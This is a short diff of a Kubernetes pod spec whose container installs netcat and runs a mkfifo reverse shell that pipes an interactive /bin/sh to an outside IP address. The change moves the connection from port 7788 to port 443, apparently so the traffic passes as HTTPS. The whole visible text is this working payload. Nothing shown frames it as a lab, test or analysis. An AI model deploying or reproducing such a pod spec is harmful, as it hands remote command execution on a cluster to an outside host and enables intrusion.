@@ -12,5 +12,5 @@ spec:
       - -c
       - |
         apk add --update netcat-openbsd
-        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.175.125.130 7788 > /tmp/f
+        rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.175.125.130 443 > /tmp/f
   restartPolicy: Never
